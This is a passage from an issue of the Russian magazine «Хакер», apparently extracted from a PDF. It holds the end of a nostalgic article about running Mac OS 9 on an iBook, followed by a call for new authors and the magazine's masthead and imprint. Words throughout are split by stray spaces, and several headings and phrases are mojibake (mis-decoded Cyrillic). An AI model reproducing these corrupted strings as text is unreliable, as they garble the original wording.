на рынке новых компьютеров iMac G3 и PowerMac G3. Этим долгожданным
обновлением ста ла Mac OS 8, где появил ся многопоточ ный Finder, который
позволил выполнять нес колько опе раций с файлами одновремен но, улучшена
поддержка USB и FireWire. В версии 8.1 добави лась новая файловая система
HFS+, которая обеспечива ла более эффектив ное управле ние дисковым
пространс твом, а начиная с версии 8.5 сис тема ста ла работать только
на процессорах PowerPC. Но внутри это была все та же клас сическая
«макось», ноги которой росли из вось мидесятых — со все ми сопутствующими
ограничениями.





                         Mac OS 8


ÏÎÑËÅÄÍÈÉ ÈÇ ÌÎÃÈÊÀÍ

Ус тановленная на моем iBook Mac OS 9 — пос ледняя «клас сическая» вер сия
«макоси», уви дев шая свет перед окончательным переходом Apple на перера -
ботан ную плат форму NeXTSTEP. Apple приобрела компанию NeXT, обладав -
шую лицен зией на  эту платформу, в 1997  году, но, чтобы превратить
NeXTSTEP в новую ОС для «маков», требовалось время.
  Вы пущенная 23 октября 1999 года «девятка» была приз вана улучшить ста -
бильность и функци ональ ность Mac OS 8, то есть стала своего рода компро -
мис сным вари антом в ожи дании появления OS X. Разработчики добавили
автоматичес кую загрузку обновлений через интернет (Software Update), усо -
вершенс твованную поддер жку многополь зовательского режима, и вообще,
Apple позициони рова ла Mac OS 9 как «лучшую опе рационную систему всех
вре мен для работы с интернетом». Но так ли это, особенно с учетом того, что
счас тливые владель цы PC в том же 1999 году уже вовсю использовали
Windows 98, где с этим самым интернетом все было как раз в полном поряд -
ке?





                    Мой iBook с Mac OS 9

Если ты привык к сов ременной OS X, интерфейс клас сической «макоси», ско -
рее всего, вызовет у тебя лег кую оторопь. Удобной панели Dock нет и в
помине, вмес то нее — узенькая «гармошка» с кнопками, назначение которой
понять поначалу очень непросто. Эта панель ка называется Control  Strip,
и предназна чена она  для  управления основны ми фун кциями  системы
и получе ния информации о сос тоянии компь ютера, а совсем не для запуска
приложе ний. Нап ример, тут можно изме нить яркость экрана, громкость зву ка,
посмотреть уровень заряда батареи  ноут бука, проверить под ключение
к сетям и выз вать другие час то исполь зуемые фун кции ОС. Кноп ки мож но
добав лять и менять мес тами, а саму панель Control Strip — перемещать вдоль
левого или пра вого края экра на, а также сворачивать или разворачивать
для экономии мес та на рабочем столе.





                                 Control Strip

Хорошо хоть, в верхней час ти дис плея располагается знакомая коман -
дно-инструментальная панель с налив ным яблочком, по щел чку мышью
на котором откры вает ся сис темное меню. Правда, содержимое этого меню,
равно как и других в этой панели, отли чает ся от привычных современ ному
юзеру. Тем не менее основная концепция здесь та же: панель ка отображает
меню активного приложения и системные инди каторы, вро де раскладки кла -
виату ры и часов. Однако она не под держивает рас ширения сторонних раз -
работчиков и практически никак не нас траивается, в отличие от меню-бар
в OS X, поведением которой можно управлять с использовани ем различных
ути лит.





                   Меню-бар Mac OS 9

Так что же в Mac OS 9 с интерне том? Браузер в Mac OS 9 име ется, но это
не при вычный Safari, а… Microsoft Internet Explorer! Он был вклю чен в состав
ОС  бла годаря  подписанному  в  1997  году  соглашению меж ду  Apple
и Microsoft. По условиям соглашения Internet Explorer становился браузе ром
по умолчанию на платформе Macintosh, от чего выигрывали все: Apple
получи ла современный и функци ональ ный бра узер, а Microsoft расширяла
свое при сутствие на рынке Mac. Internet Explorer для Mac использовал собс -
твенный дви жок Tasman, раз работанный специально для этой платформы,
но сай ты в нем отоб ражались в точности так же, как и в MSIE для Windows, что
обес печивало хорошую совмести мость с веб-стан дартами того времени.
Полностью  под держку  этого  браузера  в Mac OS  прек ратили  только
в 2003 году.





     В MSIE на Mac OS 9 нормально открывает ся только сайт Chat.ru

Бра узер — далеко не единс твенный продукт Microsoft, который имеется
на моем ноутбуке: второй — это Microsoft Word for Mac. Надо сказать, что
визуаль но этот тек стовый редактор прак тически неот личим от старого доб -
рого Word 97, которым я когда-то пользовался под Windows 98, и работает он
вполне снос но и ста биль но.





                          Microsoft Word на Mac OS 9

По мимо Internet Explorer и файлового менеджера Finder, в составе Mac OS
9 имеется утилита для поиска информации в интернете и на локальном дис ке
под  наз вани ем  Sherlock,  муль тимедий ный  проигрыватель  QuickTime,
адресная кни га, калькулятор, календарь, часы и простенький поч товый кли -
ент. Ну и других программ под эту опе раци онку в те вре мена существовало
в избытке: от полезных утилит до игр. Правда, при всем этом разнооб разии
под капотом у Mac OS 9 пряталась все та же древняя, как мамонт, система
из восьмидесятых, со всем своим богатым наследием.
  В общем, перед пользовате лями компь юте ров Apple на рубеже эпох сто ял
неп ростой выбор: морально уста ревшая «девят ка» или тормозная и сырая
«десятка», для которой еще не успели раз работать достаточный ассортимент
софта. И оба варианта, ска жем прямо, были так себе.
  Тем не менее имен но в этом про тиворечии и заключалась сила Apple: ком -
пания соз натель но пошла на болез ненный разрыв с прошлым, отказав шись
от «классичес кой» ОС в поль зу новой плат формы на основе ядра XNU,
которая впос ледс твии ста ла фундаментом всех ОС корпорации, включая iOS
и watchOS.
  Mac OS 9 осталась пос ледним представителем ушедшей эпохи, системой,
в которую лег ко влю бить ся, но которую невозможно было развивать. Однако
что-то в этом неб роском интерфей се все-таки есть: что-то, чего, возможно,
очень не хватает некоторым сов ремен ным операционкам, — простоты,
непос редс твенности и лаконичности. Mac OS 9 не стре милась поразить
пользователя ани маци ей, красотой значков или визуальными эффектами,
не диктовала, как работать с компь ютером, не собирала втихаря информа -
цию и не пря тала важные настрой ки за сло ями абстракции. В ней все было
на виду — чуть арха ично и угловато, но по-нас тоящему честно.
«Хакеру» всегда нужны новые авторы, и ты можешь стать
одним из них! Если тебе интерес но то, о чем мы пишем,
и есть желание исследовать эти темы вмес те, не упусти воз -
можность вступить в ряды наших авто ров и получать за это
все, что им причита ется.


 • Àâ òîðû ïîëó÷àþò äåíåæíîå âîç íàãðàæäåíèå. Размер зависит от слож -
   ности и уни каль ности темы и объ ема проделан ной работы (но не от объ -
  ема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñ ïëàò íî : каждая опубликованная статья
   при носит месяц под писки и зна чительно увеличи вает личную скидку. Уже
   пос ле третьего раза подписка ста нет бесплат ной нав сегда.

Кро ме того, íàëè÷èå ïóá ëèêàöèé — ýòî îòëè÷íûé ñïî ñîá ïîêàçàòü
ðàáîòî äàòå ëþ è êîë ëåãàì, ÷òî òû â òåìå . Если ты студент или научный
сот рудник, ïóá ëèêàöèÿ â æóðíàëå ïðèãîäèòñÿ îñî áåí íî . А еще мы пла -
нируем запуск англоязыч ной версии, так что ó òåáÿ áóäåò øàíñ áûòü
óçíàííûì è çà ðóáåæîì .
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòî ðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссыл ку на сайт и профили в соцсетях. Или,
наоборот, не делать это го в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — зна ния по теме, а не корочки журналиста. Зна ешь
тему — зна чит, и написать сможешь. Не умеешь — поможем, будешь сом -
невать ся — под держим, накосячишь — отредактируем. Не зря у нас работа ет
столько редакторов! Они не толь ко правят бук вы, но и помогают с темами
и форматом и «при чесы вают» автор ский текст, если в этом есть необ -
ходимость. И конечно, перед публикаци ей мы согласуем с автором все прав -
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для ста тей — дело непростое, но и не такое слож ное, как может
показать ся. Сто ит начать, и ты навер няка будешь придумы вать темы одну
за дру гой!
  Первым делом задай себе несколько прос тых вопросов:
 • «Ðàç áèðàþñü ëè ÿ â ÷åì-òî, ÷òî ìîæåò çàèí òåðåñîâàòü äðó ãèõ?» Час -
   тый слу чай: люди дела ют что-то потрясающее, но считают свое занятие
   вполне обы денным. Если  твои мама и бабушка не  хотят  слушать
   про реверс малвари, сборку ядра Linux, проекти рование микропроцес -
   соров или хранение данных в ДНК, это не зна чит, что у тебя не найдется
   благодарных читате лей.
 • «Áûëè ëè ó ìåíÿ â ïîñ ëåäíåå âðå ìÿ èíòå ðåñ íûå ïðîåêòû?» Если ты
   ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   раз рабатываешь  что-то необычное или даже прос то настро ил себе
   какую-то удобную штукови ну, обя зательно расскажи нам! Мы вместе при -
   дума ем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ-òî èñòîðèþ, êîòîðàÿ êàæåò ñÿ ìíå êðó òîé?» Поп -
   робуй вспомнить: если ты  буквально недавно рас сказывал  кому-то
  о чем-то очень важном или захватывающем (и связан ном с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîä ìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñ òèëè ÷òî-òî âàæíîå?» Если мы
  о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было челове ка, который
   взял бы ее на себя. Кста ти, даже если писать сам ты не собираешься, под -
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. При думы ваешь акту альную тему или несколько.
 2. Описываешь эту тему так, что бы было понят но, что будет в статье и зачем
   ее кому-то читать. Обычно достаточ но рабочего заголовка и нескольких
   пред ложений (pro tip: их потом можно пустить на введение).
 3. Вы бира ешь редактора и отправляешь ему свои темы (мож но главреду —
   он разберет ся). Заодно неплохо быва ет пред ста виться и написать пару
   слов о себе.
 4. С редактором сог ласуете детали и сро ки сда чи черновика. Также он выда -
   ет тебе пра вила оформле ния и отве чает на твои вопросы.
 5. Пи шешь статью в срок и отправ ляешь ее. Если воз никают какие-то проб -
   лемы, сомнения или просто задер жки, ты знаешь, к кому обращаться.
 6. Редактор чита ет статью, при нимает ее или возвра щает с просьбой
   доработать и руководс твом к действию.
 7. Перед пуб ликаци ей получа ешь версию с прав ками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожида ешь ся выхода статьи и поступления вознаграждения.




Если готов пуб ликоваться в «Хакере», придумай тему для первой статьи
и предложи ре дакции .
   №6 (315)

        Андрей Письменный      Валентин Хол могоров         Илья Русанен
             Главный редактор           Ведущий редактор               Разработка
             pismenny@glc.ru            valentin@holmogorov.ru            rusanen@glc.ru
                     Ев гения Шарипова             yambuto
                       Литератур ный редактор           Бильд-редактор
                                                    yambuto@gmail.com


                          MEGANEWS

                            Мария Нефёдо ва
                                            nefedova@glc.ru


                    КОНСУЛЬТАЦИОННЫЙ СОВЕТ

                                 Иван Андреев, Олег Афо нин,
                               Марк Бруц кий-Стем пковский,
                                    Алексей Глазков, Nik Zerof,
                                   Юрий Язев


                             РЕКЛАМА

                                  Анна Яковлева
                                  Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                       Воп росы о подписке:        Вопросы о матери алах:
                                lapina@glc.ru                 support@glc.ru





Учредитель: ИП Яков лева Анна Вадимовна ИНН 503806735948 ОГРН/ОГРНИП 320508100264021. Адрес: 141271, Россия, Мос ковская область,
Пушкино, мкр Соф рино-1, дом 28, квар тира 58. Телефон: +7(980)4591655. Зарегис трировано Федеральной служ бой по надзору в сфере связи,
информационных технологий и мас совых коммуникаций (Роскомнадзоре), свидетельство ЭЛ № ФС 77 — 73894 от 12.10.2018 года. Мнение
редакции не обязательно сов пада ет с мнением авторов. Все матери алы в номере пре доставля ются как информа ция к размышлению. Лица,
использующие данную информацию в противо законных целях, могут быть привлечены к ответственности. Редакция не несет ответственности
за содержание рекламных объ явле ний в номере. По вопросам лицензирования и получения прав на использование редак ционных материалов
журнала обра щайтесь по адресу: content@glc.ru. © Журнал «Хакер», РФ, 2025